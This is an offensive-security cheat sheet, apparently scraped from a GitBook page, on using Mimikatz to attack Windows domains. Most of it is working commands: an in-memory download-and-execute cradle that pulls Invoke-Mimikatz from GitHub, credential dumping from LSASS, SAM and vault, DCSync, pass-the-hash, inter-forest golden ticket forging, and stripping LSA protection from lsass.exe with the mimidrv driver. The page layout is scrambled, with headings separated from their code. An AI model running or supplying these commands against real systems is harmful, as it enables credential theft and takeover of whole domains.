# Mimikatz

URL: [https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1)
### Dump Credentials

```
# Download and execute in cradle
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Dump creds from memory
Invoke-Mimikatz -DumpCreds

# DCSync Attack
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:security.local /user:moe"'

# Dump local passwords
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

# Dump Credential Vault
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'

# Dump credentials on remote systems
Invoke-Mimikatz -DumpCreds -ComputerName @("WS01","WS02")
```

### Dump Domain Credentials

### Spawn PowerShell (with compromised NTLM hash)

### Forge Inter-domain trust ticket

### Over pass the hash

## Protection Bypass
The below image represents an attempt to access the lsass.exe process and extract clear text passwords and run a skeleton key attack. As we can see this has not been successful since applying the registry key change mentioned in the mitigation section for LSA Protection.![](../../~gitbook/image.md)We can check if the LSA Protection RunAsPPL key exists by querying the registry to confirm the LSA protection is in place.This can be bypassed by utilizing the `mimidrv.sys` driver file which is included as a separate file with mimikatz.circle-infoThe mimidrv.sys driver file needs to exists in the same directory as mimikatz.exe.The driver can be loaded by running the command `!+` in `Mimikatz`. After doing so the following command can be execute to protect the `mimikatz.exe` process.The same command with the `/remove` flag can be used to strip the process protection from a process such as `lsass.exe`From here we should be free to perform actions against LSASS and dump credentials from it.Last updated 10 months ago- [Dump Credentials](#dump-credentials)
- [Dump Domain Credentials](#dump-domain-credentials)
- [Spawn PowerShell (with compromised NTLM hash)](#spawn-powershell-with-compromised-ntlm-hash)
- [Forge Inter-domain trust ticket](#forge-inter-domain-trust-ticket)
- [Over pass the hash](#over-pass-the-hash)
- [Protection Bypass](#protection-bypass)

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:DomainAdmin /domain:Security.local /ntlm:b38ff50264b7458734d82c69794a4d8 /run:powershell.exe"'
```

```
# Obtain trust key between current domain and external domain
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# An inter-forest TGT can be forged
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:Security.local /sid:S-1-5-21-1874506000-3219952063-538504511 /rc4:815720462a1b48256f16740b70356b7f /service:krbtgt /target:Vault.local /ticket:C:\AD\trust_forest_tkt.kirbi"'
```

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:Security.local /ntlm: /run:powershell.exe"'
```

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "RunAsPPL"
# Value 0x1 means LSA Protection is enabled
```

```
!processProtect /process:mimikatz.exe
```

```
!processprotect /process:lsass.exe /remove
```

```
mimikatz.exe sekurlsa::logonpasswords
```
